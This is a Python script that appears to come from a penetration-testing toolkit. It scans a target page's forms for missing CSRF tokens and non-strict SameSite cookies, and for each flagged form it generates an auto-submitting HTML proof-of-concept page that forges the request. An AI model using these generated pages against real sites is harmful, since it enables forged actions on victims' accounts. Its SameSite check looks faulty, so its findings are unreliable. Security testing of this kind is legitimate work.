#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import re

class CSRFTester:
    def __init__(self, target):
        self.target = target
        self.vulnerable_forms = []
        
    def check_csrf_token(self, form):
        # Check for CSRF token in form
        csrf_fields = form.find_all(['input', 'meta'], attrs={
            'name': re.compile(r'csrf|token|nonce', re.I)
        })
        
        if not csrf_fields:
            return False
        return True
        
    def check_same_site_cookie(self, response):
        cookies = response.cookies
        for cookie in cookies:
            if 'SameSite' not in cookie.__dict__:
                return False
            if cookie.__dict__['SameSite'].lower() != 'strict':
                return False
        return True
        
    def generate_poc(self, form, url):
        form_data = {}
        inputs = form.find_all('input')
        
        for input_field in inputs:
            if input_field.get('name'):
                form_data[input_field['name']] = input_field.get('value', '')
                
        poc_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>CSRF PoC</title>
        </head>
        <body>
            <h1>CSRF Proof of Concept</h1>
            <form id="csrf-form" action="{url}" method="POST">
        """
        
        for name, value in form_data.items():
            poc_html += f'<input type="hidden" name="{name}" value="{value}">\n'
            
        poc_html += """
            </form>
            <script>
                document.getElementById('csrf-form').submit();
            </script>
        </body>
        </html>
        """
        
        return poc_html
        
    def test(self):
        print(colored("\n[*] Starting CSRF Scanner...", "cyan"))
        print(colored("=" * 50, "cyan"))
        
        try:
            # Get initial page
            response = requests.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action', '')
                if not form_action:
                    form_action = self.target
                    
                # Check if form has CSRF protection
                has_csrf_token = self.check_csrf_token(form)
                has_same_site = self.check_same_site_cookie(response)
                
                if not has_csrf_token or not has_same_site:
                    print(colored(f"[!] Potential CSRF vulnerability found in form: {form_action}", "red"))
                    
                    # Generate PoC
                    poc = self.generate_poc(form, form_action)
                    
                    self.vulnerable_forms.append({
                        "url": form_action,
                        "has_csrf_token": has_csrf_token,
                        "has_same_site": has_same_site,
                        "poc": poc
                    })
                    
                    print(colored(f"    Form URL: {form_action}", "yellow"))
                    print(colored(f"    CSRF Token Present: {'Yes' if has_csrf_token else 'No'}", "yellow"))
                    print(colored(f"    SameSite Cookie Present: {'Yes' if has_same_site else 'No'}", "yellow"))
                    
            # Print summary
            if self.vulnerable_forms:
                print(colored("\n[+] CSRF Vulnerabilities Found:", "green"))
                for vuln in self.vulnerable_forms:
                    print(colored(f"\nForm URL: {vuln['url']}", "yellow"))
                    print(colored(f"CSRF Token Present: {'Yes' if vuln['has_csrf_token'] else 'No'}", "yellow"))
                    print(colored(f"SameSite Cookie Present: {'Yes' if vuln['has_same_site'] else 'No'}", "yellow"))
                    print(colored("\nPoC HTML:", "yellow"))
                    print(vuln['poc'])
            else:
                print(colored("\n[-] No CSRF vulnerabilities found.", "green"))
                
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Error scanning target: {str(e)}", "red"))
            return False
            
        return True 